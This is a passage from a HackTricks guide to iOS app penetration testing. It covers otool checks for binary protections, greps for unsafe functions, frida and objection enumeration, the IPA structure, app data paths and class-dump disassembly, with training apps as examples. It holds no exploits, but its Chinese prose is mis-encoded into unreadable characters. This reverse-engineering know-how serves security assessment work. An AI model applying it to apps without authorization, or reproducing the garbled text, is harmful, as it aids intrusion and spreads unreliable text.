# iOSæ¸—é€æµ‹è¯•

<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
ä½¿ç”¨[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)è½»æ¾æ„å»ºå’Œè‡ªåŠ¨åŒ–ç”±å…¨çƒ**æœ€å…ˆè¿›**çš„ç¤¾åŒºå·¥å…·æä¾›æ”¯æŒçš„å·¥ä½œæµç¨‹ã€‚\
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ YouTube ğŸ¥</strong></a></summary>

* ä½ åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…æƒ³è¦è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–åœ¨**Twitter**ä¸Š**å…³æ³¨**æˆ‘[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

## iOSåŸºç¡€çŸ¥è¯†

{% content-ref url="ios-basics.md" %}
[ios-basics.md](ios-basics.md)
{% endcontent-ref %}

## æµ‹è¯•ç¯å¢ƒ

åœ¨æœ¬é¡µé¢ä¸­ï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°å…³äº**iOSæ¨¡æ‹Ÿå™¨**ã€**æ¨¡æ‹Ÿå™¨**å’Œ**è¶Šç‹±**çš„ä¿¡æ¯ï¼š

{% content-ref url="ios-testing-environment.md" %}
[ios-testing-environment.md](ios-testing-environment.md)
{% endcontent-ref %}

## åˆå§‹åˆ†æ

### åŸºæœ¬iOSæµ‹è¯•æ“ä½œ

åœ¨æµ‹è¯•è¿‡ç¨‹ä¸­ï¼Œä¼šå»ºè®®æ‰§è¡Œ**å¤šä¸ªæ“ä½œ**ï¼ˆè¿æ¥è®¾å¤‡ã€è¯»å–/å†™å…¥/ä¸Šä¼ /ä¸‹è½½æ–‡ä»¶ã€ä½¿ç”¨ä¸€äº›å·¥å…·...ï¼‰ã€‚å› æ­¤ï¼Œå¦‚æœæ‚¨ä¸çŸ¥é“å¦‚ä½•æ‰§è¡Œè¿™äº›æ“ä½œï¼Œè¯·**å¼€å§‹é˜…è¯»é¡µé¢**ï¼š

{% content-ref url="basic-ios-testing-operations.md" %}
[basic-ios-testing-operations.md](basic-ios-testing-operations.md)
{% endcontent-ref %}

{% hint style="info" %}
å¯¹äºä»¥ä¸‹æ­¥éª¤ï¼Œåº”è¯¥å·²ç»åœ¨è®¾å¤‡ä¸Šå®‰è£…äº†åº”ç”¨ç¨‹åºï¼Œå¹¶ä¸”å·²ç»è·å¾—äº†åº”ç”¨ç¨‹åºçš„**IPAæ–‡ä»¶**ã€‚\
é˜…è¯»[åŸºæœ¬iOSæµ‹è¯•æ“ä½œ](basic-ios-testing-operations.md)é¡µé¢ä»¥äº†è§£å¦‚ä½•æ‰§è¡Œæ­¤æ“ä½œã€‚
{% endhint %}

### åŸºæœ¬é™æ€åˆ†æ

å»ºè®®ä½¿ç”¨å·¥å…·[**MobSF**](https://github.com/MobSF/Mobile-Security-Framework-MobSF)å¯¹IPAæ–‡ä»¶æ‰§è¡Œè‡ªåŠ¨é™æ€åˆ†æã€‚

è¯†åˆ«äºŒè¿›åˆ¶æ–‡ä»¶ä¸­å­˜åœ¨çš„**ä¿æŠ¤æªæ–½**ï¼š

*   **PIEï¼ˆä½ç½®æ— å…³å¯æ‰§è¡Œæ–‡ä»¶ï¼‰**ï¼šå¯ç”¨åï¼Œåº”ç”¨ç¨‹åºæ¯æ¬¡å¯åŠ¨æ—¶éƒ½ä¼šåŠ è½½åˆ°éšæœºçš„å†…å­˜åœ°å€ï¼Œä½¿å¾—éš¾ä»¥é¢„æµ‹å…¶åˆå§‹å†…å­˜åœ°å€ã€‚

```
otool -hv <app-binary> | grep PIE   # åº”è¯¥åŒ…å«PIEæ ‡å¿—
```
*   **å †æ ˆä¿æŠ¤**ï¼šä¸ºäº†éªŒè¯å †æ ˆçš„å®Œæ•´æ€§ï¼Œåœ¨è°ƒç”¨å‡½æ•°ä¹‹å‰ï¼Œåœ¨å †æ ˆä¸Šæ”¾ç½®ä¸€ä¸ªâ€œcanaryâ€å€¼ï¼Œå¹¶åœ¨å‡½æ•°ç»“æŸåå†æ¬¡éªŒè¯ã€‚

```
otool -I -v <app-binary> | grep stack_chk   # åº”è¯¥åŒ…å«stack_chk_guardå’Œstack_chk_failç¬¦å·
```
*   **ARCï¼ˆè‡ªåŠ¨å¼•ç”¨è®¡æ•°ï¼‰**ï¼šç”¨äºé˜²æ­¢å¸¸è§çš„å†…å­˜æŸåæ¼æ´

```
otool -I -v <app-binary> | grep objc_release   # åº”è¯¥åŒ…å«_objc_releaseç¬¦å·
```
*   **åŠ å¯†äºŒè¿›åˆ¶æ–‡ä»¶**ï¼šäºŒè¿›åˆ¶æ–‡ä»¶åº”è¯¥æ˜¯åŠ å¯†çš„

```
otool -arch all -Vl <app-binary> | grep -A5 LC_ENCRYPT   # cryptidåº”è¯¥ä¸º1
```

**è¯†åˆ«æ•æ„Ÿ/ä¸å®‰å…¨çš„å‡½æ•°**

*   **å¼±å“ˆå¸Œç®—æ³•**

```
# åœ¨iOSè®¾å¤‡ä¸Š
otool -Iv <app> | grep -w "_CC_MD5"
otool -Iv <app> | grep -w "_CC_SHA1"

# åœ¨Linuxä¸Š
grep -iER "_CC_MD5"
grep -iER "_CC_SHA1"
```
*   **ä¸å®‰å…¨çš„éšæœºå‡½æ•°**

```
# åœ¨iOSè®¾å¤‡ä¸Š
otool -Iv <app> | grep -w "_random"
otool -Iv <app> | grep -w "_srand"
otool -Iv <app> | grep -w "_rand"

# åœ¨Linuxä¸Š
grep -iER "_random"
grep -iER "_srand"
grep -iER "_rand"
```
*   **ä¸å®‰å…¨çš„'Malloc'å‡½æ•°**

```
# åœ¨iOSè®¾å¤‡ä¸Š
otool -Iv <app> | grep -w "_malloc"

# åœ¨Linuxä¸Š
grep -iER "_malloc"
```
*   **ä¸å®‰å…¨å’Œæ˜“å—æ”»å‡»çš„å‡½æ•°**

```
# åœ¨iOSè®¾å¤‡ä¸Š
otool -Iv <app> | grep -w "_gets"
otool -Iv <app> | grep -w "_memcpy"
otool -Iv <app> | grep -w "_strncpy"
otool -Iv <app> | grep -w "_strlen"
otool -Iv <app> | grep -w "_vsnprintf"
otool -Iv <app> | grep -w "_sscanf"
otool -Iv <app> | grep -w "_strtok"
otool -Iv <app> | grep -w "_alloca"
otool -Iv <app> | grep -w "_sprintf"
otool -Iv <app> | grep -w "_printf"
otool -Iv <app> | grep -w "_vsprintf"

# åœ¨Linuxä¸Š
grep -R "_gets"
grep -iER "_memcpy"
grep -iER "_strncpy"
grep -iER "_strlen"
grep -iER "_vsnprintf"
grep -iER "_sscanf"
grep -iER "_strtok"
grep -iER "_alloca"
grep -iER "_sprintf"
grep -iER "_printf"
grep -iER "_vsprintf"
```
### åŸºæœ¬åŠ¨æ€åˆ†æ

æŸ¥çœ‹[**MobSF**](https://github.com/MobSF/Mobile-Security-Framework-MobSF)æ‰§è¡Œçš„åŠ¨æ€åˆ†æã€‚æ‚¨éœ€è¦æµè§ˆä¸åŒçš„è§†å›¾å¹¶ä¸å…¶è¿›è¡Œäº¤äº’ï¼Œä½†å®ƒå°†é’©ä½å‡ ä¸ªç±»å¹¶æ‰§è¡Œå…¶ä»–æ“ä½œï¼Œä¸€æ—¦å®Œæˆï¼Œå°†ç”Ÿæˆä¸€ä»½æŠ¥å‘Šã€‚

### åˆ—å‡ºå·²å®‰è£…çš„åº”ç”¨ç¨‹åº

å½“é’ˆå¯¹è®¾å¤‡ä¸Šå·²å®‰è£…çš„åº”ç”¨ç¨‹åºæ—¶ï¼Œæ‚¨é¦–å…ˆéœ€è¦æ‰¾å‡ºè¦åˆ†æçš„åº”ç”¨ç¨‹åºçš„æ­£ç¡®çš„åŒ…æ ‡è¯†ç¬¦ã€‚æ‚¨å¯ä»¥ä½¿ç”¨`frida-ps -Uai`å‘½ä»¤è·å–è¿æ¥çš„USBè®¾å¤‡ä¸Šå½“å‰å·²å®‰è£…çš„æ‰€æœ‰åº”ç”¨ç¨‹åºï¼ˆ`-a`ï¼‰çš„ä¿¡æ¯ï¼ˆ`-i`ï¼‰ï¼š
```bash
$ frida-ps -Uai
PID  Name                 Identifier
----  -------------------  -----------------------------------------
6847  Calendar             com.apple.mobilecal
6815  Mail                 com.apple.mobilemail
-  App Store            com.apple.AppStore
-  Apple Store          com.apple.store.Jolly
-  Calculator           com.apple.calculator
-  Camera               com.apple.camera
-  iGoat-Swift          OWASP.iGoat-Swift
```
### åŸºæœ¬æšä¸¾å’ŒHooking

å­¦ä¹ å¦‚ä½•**æšä¸¾åº”ç”¨ç¨‹åºçš„ç»„ä»¶**ä»¥åŠå¦‚ä½•ä½¿ç”¨objectionè½»æ¾**hookæ–¹æ³•å’Œç±»**ï¼š

{% content-ref url="ios-hooking-with-objection.md" %}
[ios-hooking-with-objection.md](ios-hooking-with-objection.md)
{% endcontent-ref %}

### IPAç»“æ„

`.ipa`æ–‡ä»¶æ˜¯**å‹ç¼©**çš„**åŒ…**ï¼Œå› æ­¤æ‚¨å¯ä»¥å°†æ‰©å±•åæ›´æ”¹ä¸º`.zip`å¹¶å¯¹å…¶è¿›è¡Œ**è§£å‹ç¼©**ã€‚ä¸€ä¸ª**å®Œæ•´çš„**æ‰“åŒ…å¥½å¾…å®‰è£…çš„åº”ç”¨ç¨‹åºé€šå¸¸è¢«ç§°ä¸º**Bundle**ã€‚\
è§£å‹ç¼©åï¼Œæ‚¨åº”è¯¥çœ‹åˆ°`<NAME>.app`ï¼Œä¸€ä¸ªåŒ…å«å…¶ä»–èµ„æºçš„å‹ç¼©å­˜æ¡£ã€‚

* `Info.plist`ï¼šåŒ…å«ä¸€äº›åº”ç”¨ç¨‹åºç‰¹å®šé…ç½®çš„æ–‡ä»¶ã€‚
* `_CodeSignature/` åŒ…å«ä¸€ä¸ªplistæ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«åŒ…ä¸­æ‰€æœ‰æ–‡ä»¶çš„ç­¾åã€‚
* `Assets.car`ï¼šå¦ä¸€ä¸ªå‹ç¼©å­˜æ¡£ï¼ŒåŒ…å«èµ„æºï¼ˆå›¾æ ‡ï¼‰ã€‚
* `Frameworks/` åŒ…å«åº”ç”¨ç¨‹åºçš„æœ¬æœºåº“ï¼Œä»¥.dylibæˆ–.frameworkæ–‡ä»¶çš„å½¢å¼ã€‚
* `PlugIns/` å¯èƒ½åŒ…å«åº”ç”¨ç¨‹åºæ‰©å±•ï¼Œä»¥.appexæ–‡ä»¶çš„å½¢å¼ï¼ˆåœ¨ç¤ºä¾‹ä¸­æœªå‡ºç°ï¼‰ã€‚
* [`Core Data`](https://developer.apple.com/documentation/coredata)ï¼šç”¨äºä¿å­˜åº”ç”¨ç¨‹åºçš„ç¦»çº¿æ°¸ä¹…æ•°æ®ï¼Œç¼“å­˜ä¸´æ—¶æ•°æ®ï¼Œå¹¶åœ¨å•ä¸ªè®¾å¤‡ä¸Šä¸ºåº”ç”¨ç¨‹åºæ·»åŠ æ’¤æ¶ˆåŠŸèƒ½ã€‚ä¸ºäº†åœ¨å•ä¸ªiCloudå¸æˆ·ä¸Šè·¨å¤šä¸ªè®¾å¤‡åŒæ­¥æ•°æ®ï¼ŒCore Dataä¼šè‡ªåŠ¨å°†æ¨¡å¼é•œåƒåˆ°CloudKitå®¹å™¨ä¸­ã€‚
* [`PkgInfo`](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPRuntimeConfig/Articles/ConfigApplications.html)ï¼š`PkgInfo`æ–‡ä»¶æ˜¯æŒ‡å®šåº”ç”¨ç¨‹åºæˆ–Bundleçš„ç±»å‹å’Œåˆ›å»ºè€…ä»£ç çš„å¦ä¸€ç§æ–¹å¼ã€‚
* **en.lproj, fr.proj, Base.lproj**ï¼šæ˜¯åŒ…å«ç‰¹å®šè¯­è¨€èµ„æºçš„è¯­è¨€åŒ…ï¼Œä»¥åŠåœ¨ä¸æ”¯æŒæŸç§è¯­è¨€æ—¶çš„é»˜è®¤èµ„æºã€‚

åœ¨iOSåº”ç”¨ç¨‹åºä¸­ï¼Œæœ‰å¤šç§å®šä¹‰UIçš„æ–¹å¼ï¼š_storyboard_, _nib_ æˆ– _xib_ æ–‡ä»¶ã€‚

**Info.plist**

ä¿¡æ¯å±æ€§åˆ—è¡¨æˆ–`Info.plist`æ˜¯iOSåº”ç”¨ç¨‹åºçš„ä¸»è¦ä¿¡æ¯æ¥æºã€‚å®ƒç”±ä¸€ä¸ªç»“æ„åŒ–æ–‡ä»¶ç»„æˆï¼Œå…¶ä¸­åŒ…å«æè¿°åº”ç”¨ç¨‹åºçš„åŸºæœ¬é…ç½®ä¿¡æ¯çš„**é”®å€¼å¯¹**ã€‚å®é™…ä¸Šï¼Œæ‰€æœ‰æ‰“åŒ…çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼ˆåº”ç”¨ç¨‹åºæ‰©å±•ã€æ¡†æ¶å’Œåº”ç”¨ç¨‹åºï¼‰éƒ½**åº”è¯¥æœ‰**ä¸€ä¸ª`Info.plist`æ–‡ä»¶ã€‚æ‚¨å¯ä»¥åœ¨[**Appleå¼€å‘è€…æ–‡æ¡£**](https://developer.apple.com/documentation/bundleresources/information\_property\_list?language=objc)ä¸­æ‰¾åˆ°æ‰€æœ‰å¯èƒ½çš„é”®ã€‚

è¯¥æ–‡ä»¶å¯èƒ½ä»¥**XMLæˆ–äºŒè¿›åˆ¶ï¼ˆbplistï¼‰**æ ¼å¼è¿›è¡Œæ ¼å¼åŒ–ã€‚æ‚¨å¯ä»¥ä½¿ç”¨ä¸€ä¸ªç®€å•çš„å‘½ä»¤å°†å…¶**è½¬æ¢ä¸ºXML**æ ¼å¼ï¼š

*   åœ¨macOSä¸Šä½¿ç”¨`plutil`ï¼Œè¿™æ˜¯ä¸€ä¸ªä¸macOS 10.2åŠä»¥ä¸Šç‰ˆæœ¬ä¸€èµ·è‡ªå¸¦çš„å·¥å…·ï¼ˆç›®å‰æ²¡æœ‰å®˜æ–¹åœ¨çº¿æ–‡æ¡£ï¼‰ï¼š

```bash
$ plutil -convert xml1 Info.plist
```
*   åœ¨Linuxä¸Šï¼š

```bash
$ apt install libplist-utils
$ plistutil -i Info.plist -o Info_xml.plist
```

ä¸‹é¢æ˜¯ä¸€äº›ä¿¡æ¯åŠå…¶åœ¨`Info.plist`æ–‡ä»¶ä¸­å¯¹åº”çš„å…³é”®å­—çš„éè¯¦å°½åˆ—è¡¨ï¼Œæ‚¨å¯ä»¥é€šè¿‡æ£€æŸ¥æ–‡ä»¶æˆ–ä½¿ç”¨`grep -i <keyword> Info.plist`æ¥è½»æ¾æœç´¢`Info.plist`æ–‡ä»¶ä¸­çš„è¿™äº›å…³é”®å­—ï¼š

* åº”ç”¨ç¨‹åºæƒé™ç›®çš„å­—ç¬¦ä¸²ï¼š`UsageDescription`
* è‡ªå®šä¹‰URL schemesï¼š`CFBundleURLTypes`
* å¯¼å‡º/å¯¼å…¥çš„è‡ªå®šä¹‰æ–‡æ¡£ç±»å‹ï¼š`UTExportedTypeDeclarations` / `UTImportedTypeDeclarations`
* åº”ç”¨ç¨‹åºä¼ è¾“å®‰å…¨ï¼ˆATSï¼‰é…ç½®ï¼š`NSAppTransportSecurity`

è¯·å‚è€ƒç›¸å…³ç« èŠ‚ï¼Œäº†è§£å¦‚ä½•æµ‹è¯•è¿™äº›ç‚¹çš„æ›´å¤šä¿¡æ¯ã€‚

**æ•°æ®è·¯å¾„**

åœ¨iOSä¸Šï¼Œ**ç³»ç»Ÿåº”ç”¨ç¨‹åºå¯ä»¥åœ¨`/Applications`**ç›®å½•ä¸­æ‰¾åˆ°ï¼Œè€Œ**ç”¨æˆ·å®‰è£…çš„**åº”ç”¨ç¨‹åºå¯ä»¥åœ¨**`/private/var/containers/`**ä¸‹æ‰¾åˆ°ã€‚ç„¶è€Œï¼Œä»…é€šè¿‡æµè§ˆæ–‡ä»¶ç³»ç»Ÿæ¥æ‰¾åˆ°æ­£ç¡®çš„æ–‡ä»¶å¤¹å¹¶ä¸æ˜¯ä¸€é¡¹ç®€å•çš„ä»»åŠ¡ï¼Œå› ä¸º**æ¯ä¸ªåº”ç”¨ç¨‹åºéƒ½ä¼šè¢«åˆ†é…ä¸€ä¸ªéšæœºçš„128ä½UUID**ï¼ˆé€šç”¨å”¯ä¸€æ ‡è¯†ç¬¦ï¼‰ä½œä¸ºå…¶ç›®å½•åç§°ã€‚

ä¸ºäº†è½»æ¾è·å–ç”¨æˆ·å®‰è£…çš„åº”ç”¨ç¨‹åºçš„å®‰è£…ç›®å½•ä¿¡æ¯ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨**objectionçš„`env`å‘½ä»¤**ï¼Œå®ƒè¿˜ä¼šæ˜¾ç¤ºåº”ç”¨ç¨‹åºçš„æ‰€æœ‰ç›®å½•ä¿¡æ¯ï¼š
```bash
OWASP.iGoat-Swift on (iPhone: 11.1.2) [usb] # env

Name               Path
-----------------  -------------------------------------------------------------------------------------------
BundlePath         /var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app
CachesDirectory    /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Library/Caches
DocumentDirectory  /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Documents
LibraryDirectory   /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Library
```
æ­£å¦‚æ‚¨æ‰€è§ï¼Œåº”ç”¨ç¨‹åºæœ‰ä¸¤ä¸ªä¸»è¦ä½ç½®ï¼š

* **Bundle** **ç›®å½•** (`/var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/`)ã€‚
* **Data ç›®å½•** (`/var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/`)ã€‚

è¿™äº›æ–‡ä»¶å¤¹åŒ…å«åœ¨åº”ç”¨ç¨‹åºå®‰å…¨è¯„ä¼°æœŸé—´å¿…é¡»ä»”ç»†æ£€æŸ¥çš„ä¿¡æ¯ï¼ˆä¾‹å¦‚åˆ†æå­˜å‚¨çš„æ•æ„Ÿæ•°æ®æ—¶ï¼‰ã€‚

**Bundle ç›®å½•ï¼š**

* **AppName.app**
* è¿™æ˜¯ä¹‹å‰åœ¨ IPA ä¸­çœ‹åˆ°çš„åº”ç”¨ç¨‹åºåŒ…ï¼Œå®ƒåŒ…å«äº†å¿…è¦çš„åº”ç”¨ç¨‹åºæ•°æ®ã€é™æ€å†…å®¹ä»¥åŠåº”ç”¨ç¨‹åºçš„ç¼–è¯‘äºŒè¿›åˆ¶æ–‡ä»¶ã€‚
* æ­¤ç›®å½•å¯¹ç”¨æˆ·å¯è§ï¼Œä½†**ç”¨æˆ·æ— æ³•å†™å…¥å…¶ä¸­**ã€‚
* æ­¤ç›®å½•ä¸­çš„å†…å®¹**ä¸ä¼šå¤‡ä»½**ã€‚
* æ­¤æ–‡ä»¶å¤¹çš„å†…å®¹ç”¨äº**éªŒè¯ä»£ç ç­¾å**ã€‚

**Data ç›®å½•ï¼š**

* **Documents/**
* åŒ…å«æ‰€æœ‰ç”¨æˆ·ç”Ÿæˆçš„æ•°æ®ã€‚åº”ç”¨ç¨‹åºæœ€ç»ˆç”¨æˆ·å¯åŠ¨äº†æ­¤æ•°æ®çš„åˆ›å»ºã€‚
* å¯¹ç”¨æˆ·å¯è§ï¼Œ**ç”¨æˆ·å¯ä»¥å†™å…¥å…¶ä¸­**ã€‚
* æ­¤ç›®å½•ä¸­çš„å†…å®¹**ä¼šå¤‡ä»½**ã€‚
* åº”ç”¨ç¨‹åºå¯ä»¥é€šè¿‡è®¾ç½® `NSURLIsExcludedFromBackupKey` æ¥ç¦ç”¨è·¯å¾„ã€‚
* **Library/**
* åŒ…å«æ‰€æœ‰**éç”¨æˆ·ç‰¹å®š**çš„æ–‡ä»¶ï¼Œä¾‹å¦‚**ç¼“å­˜**ã€**é¦–é€‰é¡¹**ã€**Cookie**å’Œå±æ€§åˆ—è¡¨ï¼ˆplistï¼‰é…ç½®æ–‡ä»¶ã€‚
* iOS åº”ç”¨ç¨‹åºé€šå¸¸ä½¿ç”¨ `Application Support` å’Œ `Caches` å­ç›®å½•ï¼Œä½†åº”ç”¨ç¨‹åºå¯ä»¥åˆ›å»ºè‡ªå®šä¹‰å­ç›®å½•ã€‚
* **Library/Caches/**
* åŒ…å«**åŠæŒä¹…æ€§ç¼“å­˜æ–‡ä»¶**ã€‚
* å¯¹ç”¨æˆ·ä¸å¯è§ï¼Œ**ç”¨æˆ·æ— æ³•å†™å…¥å…¶ä¸­**ã€‚
* æ­¤ç›®å½•ä¸­çš„å†…å®¹**ä¸ä¼šå¤‡ä»½**ã€‚
* å½“åº”ç”¨ç¨‹åºæœªè¿è¡Œä¸”å­˜å‚¨ç©ºé—´ä¸è¶³æ—¶ï¼Œæ“ä½œç³»ç»Ÿå¯èƒ½ä¼šè‡ªåŠ¨åˆ é™¤æ­¤ç›®å½•çš„æ–‡ä»¶ã€‚
* **Library/Application Support/**
* åŒ…å«è¿è¡Œåº”ç”¨ç¨‹åºæ‰€éœ€çš„**æŒä¹…æ€§æ–‡ä»¶**ã€‚
* å¯¹ç”¨æˆ·**ä¸å¯è§**ï¼Œç”¨æˆ·æ— æ³•å†™å…¥å…¶ä¸­ã€‚
* æ­¤ç›®å½•ä¸­çš„å†…å®¹**ä¼šå¤‡ä»½**ã€‚
* åº”ç”¨ç¨‹åºå¯ä»¥é€šè¿‡è®¾ç½® `NSURLIsExcludedFromBackupKey` æ¥ç¦ç”¨è·¯å¾„ã€‚
* **Library/Preferences/**
* ç”¨äºå­˜å‚¨å¯ä»¥åœ¨åº”ç”¨ç¨‹åºé‡æ–°å¯åŠ¨å**ä»ç„¶ä¿æŒçš„å±æ€§**ã€‚
* ä¿¡æ¯ä»¥æœªåŠ å¯†çš„æ–¹å¼ä¿å­˜åœ¨åº”ç”¨ç¨‹åºæ²™ç›’ä¸­çš„ä¸€ä¸ªåä¸º \[BUNDLE\_ID].plist çš„ plist æ–‡ä»¶ä¸­ã€‚
* ä½¿ç”¨ `NSUserDefaults` å­˜å‚¨çš„æ‰€æœ‰é”®/å€¼å¯¹éƒ½å¯ä»¥åœ¨æ­¤æ–‡ä»¶ä¸­æ‰¾åˆ°ã€‚
* **tmp/**
* ä½¿ç”¨æ­¤ç›®å½•æ¥å†™å…¥**ä¸éœ€è¦åœ¨åº”ç”¨ç¨‹åºå¯åŠ¨ä¹‹é—´ä¿ç•™çš„ä¸´æ—¶æ–‡ä»¶**ã€‚
* åŒ…å«éæŒä¹…æ€§ç¼“å­˜æ–‡ä»¶ã€‚
* å¯¹ç”¨æˆ·**ä¸å¯è§**ã€‚
* æ­¤ç›®å½•ä¸­çš„å†…å®¹ä¸ä¼šå¤‡ä»½ã€‚
* å½“åº”ç”¨ç¨‹åºæœªè¿è¡Œä¸”å­˜å‚¨ç©ºé—´ä¸è¶³æ—¶ï¼Œæ“ä½œç³»ç»Ÿå¯èƒ½ä¼šè‡ªåŠ¨åˆ é™¤æ­¤ç›®å½•çš„æ–‡ä»¶ã€‚

è®©æˆ‘ä»¬ä»”ç»†æŸ¥çœ‹ Bundle ç›®å½• (`/var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app`) ä¸­ iGoat-Swift çš„åº”ç”¨ç¨‹åºåŒ…ï¼ˆ.appï¼‰ç›®å½•ï¼š
```bash
OWASP.iGoat-Swift on (iPhone: 11.1.2) [usb] # ls
NSFileType      Perms  NSFileProtection    ...  Name
------------  -------  ------------------  ...  --------------------------------------
Regular           420  None                ...  rutger.html
Regular           420  None                ...  mansi.html
Regular           420  None                ...  splash.html
Regular           420  None                ...  about.html

Regular           420  None                ...  LICENSE.txt
Regular           420  None                ...  Sentinel.txt
Regular           420  None                ...  README.txt
```
### äºŒè¿›åˆ¶åå‘å·¥ç¨‹

åœ¨ `<application-name>.app` æ–‡ä»¶å¤¹ä¸­ï¼Œä½ ä¼šæ‰¾åˆ°ä¸€ä¸ªåä¸º `<application-name>` çš„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚è¿™æ˜¯å°†è¦è¢«**æ‰§è¡Œ**çš„æ–‡ä»¶ã€‚ä½ å¯ä»¥ä½¿ç”¨å·¥å…· **`otool`** å¯¹äºŒè¿›åˆ¶æ–‡ä»¶è¿›è¡ŒåŸºæœ¬æ£€æŸ¥ï¼š
```bash
otool -Vh DVIA-v2 #Check some compilation attributes
magic  cputype cpusubtype  caps    filetype ncmds sizeofcmds      flags
MH_MAGIC_64    ARM64        ALL  0x00     EXECUTE    65       7112   NOUNDEFS DYLDLINK TWOLEVEL WEAK_DEFINES BINDS_TO_WEAK PIE

otool -L DVIA-v2 #Get third party libraries
DVIA-v2:
/usr/lib/libc++.1.dylib (compatibility version 1.0.0, current version 400.9.1)
/usr/lib/libsqlite3.dylib (compatibility version 9.0.0, current version 274.6.0)
/usr/lib/libz.1.dylib (compatibility version 1.0.0, current version 1.2.11)
@rpath/Bolts.framework/Bolts (compatibility version 1.0.0, current version 1.0.0)
[...]
```
**æ£€æŸ¥åº”ç”¨æ˜¯å¦åŠ å¯†**

æŸ¥çœ‹ä»¥ä¸‹å†…å®¹æ˜¯å¦æœ‰è¾“å‡ºï¼š
```bash
otool -l <app-binary> | grep -A 4 LC_ENCRYPTION_INFO
```
**åæ±‡ç¼–äºŒè¿›åˆ¶æ–‡ä»¶**

åæ±‡ç¼–æ–‡æœ¬éƒ¨åˆ†ï¼š
```bash
otool -tV DVIA-v2
DVIA-v2:
(__TEXT,__text) section
+[DDLog initialize]:
0000000100004ab8    sub    sp, sp, #0x60
0000000100004abc    stp    x29, x30, [sp, #0x50]   ; Latency: 6
0000000100004ac0    add    x29, sp, #0x50
0000000100004ac4    sub    x8, x29, #0x10
0000000100004ac8    mov    x9, #0x0
0000000100004acc    adrp    x10, 1098 ; 0x10044e000
0000000100004ad0    add    x10, x10, #0x268
```
è¦æ‰“å°ç¤ºä¾‹åº”ç”¨ç¨‹åºçš„**Objective-Cæ®µ**ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•ï¼š
```bash
otool -oV DVIA-v2
DVIA-v2:
Contents of (__DATA,__objc_classlist) section
00000001003dd5b8 0x1004423d0 _OBJC_CLASS_$_DDLog
isa        0x1004423a8 _OBJC_METACLASS_$_DDLog
superclass 0x0 _OBJC_CLASS_$_NSObject
cache      0x0 __objc_empty_cache
vtable     0x0
data       0x1003de748
flags          0x80
instanceStart  8
```
ä¸ºäº†è·å¾—æ›´ç´§å‡‘çš„Objective-Cä»£ç ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨[**class-dump**](http://stevenygard.com/projects/class-dump/)å·¥å…·ï¼š
```bash
class-dump some-app
//
//     Generated by class-dump 3.5 (64 bit).
//
//     class-dump is Copyright (C) 1997-1998, 2000-2001, 2004-2013 by Steve Nygard.
//

#pragma mark Named Structures

struct CGPoint {
double _field1;
double _field2;
};

struct CGRect {
struct CGPoint _field1;
struct CGSize _field2;
};

struct CGSize {
double _field1;
double _field2;
};
```
ç„¶è€Œï¼Œæœ€å¥½çš„åæ±‡ç¼–äºŒè¿›åˆ¶æ–‡ä»¶çš„é€‰é¡¹æ˜¯ï¼š[**Hopper**](https://www.hopperapp.com/download.html?)å’Œ[**IDA**](https://www.hex-rays.com/products/ida/support/download\_freeware/)ã€‚

<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
